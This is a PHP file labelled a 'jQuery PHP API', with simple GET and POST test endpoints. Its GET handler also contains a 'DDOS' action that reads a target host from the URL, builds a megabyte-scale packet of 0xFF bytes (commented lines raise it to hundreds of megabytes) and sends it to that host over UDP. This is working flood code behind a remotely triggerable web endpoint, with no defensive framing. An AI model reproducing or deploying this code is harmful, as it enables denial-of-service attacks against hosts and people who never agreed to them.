<?php
  # SAFETY TEST!
    // To be implimented at a later date.
  # jQUERY PHP API.





    # GET API.
    if ($url->segment(2) !== false && $url->segment(2) == 'get') {
      if ($url->segment(3) !== false) $get = $url->segment(3);
        else $get = 'fail';
      # Testing the GET API.
      if ($get == 'test') {
        echo 'get test successful';
      }


      if ($get == 'fail') echo 'an error occoured in the API, did you set the type and the if statement correctly?';





      if ($get == 'DDOS') {
        # Getting the required host.
        $host = $url->segment(4);
        # Making it so we can manage the large packet in PHP.
        ini_set('memory_limit', 1534217728);
        $packet  = '';
        $packets = 0;
        # Making the Big Packet!
          // for ($i = 1; $i <= 100000; $i++) $packet .= Chr(255);
          while (strlen($packet) < 100000) $packet .= Chr(255);
          # Packet coming out of while loop = 0.1MB.

          # THE PACKET ARRAY! - each left var's size is given at the right with a comment.
          $packet = $packet . $packet . $packet . $packet . $packet . $packet . $packet . $packet . $packet . $packet; #1MB.
          // $packet = $packet . $packet . $packet . $packet . $packet . $packet . $packet . $packet . $packet . $packet; #10MB.
          // $packet = $packet . $packet . $packet . $packet . $packet . $packet . $packet . $packet . $packet . $packet; #100MB.
          // $packet = $packet . $packet . $packet; #300MB.
          # End of making large-packet.

          # Measuring tool if needed.
          $by = strlen($packet);
          $kb = $by / 1000;
          $mb = $kb / 1000;
          echo $mb;

        # Doing the socket open spam.
        $rand = rand(1,65535);
        @$fp = fsockopen('udp://'.$host, 80, $errno, $errstr, 5);
        # Will check if the socket connected correctly, if so write the packet then close the connection.
        if ($fp) {
          fwrite($fp, $packet);
          fclose($fp);
          $packets++;
        }
      }




    }




    # POST API.
    if ($url->segment(2) !== false && $url->segment(2) == 'post') {
      if (isset($_POST['type'])) $post = $_POST['type'];
        else $post = 'fail';
      # Testing the GET API.
      if ($post == 'test') {
        echo 'post test successful';
      }

      if ($post == 'fail') echo 'an error occoured in the API, did you set the type and the if statement correctly?';
    }
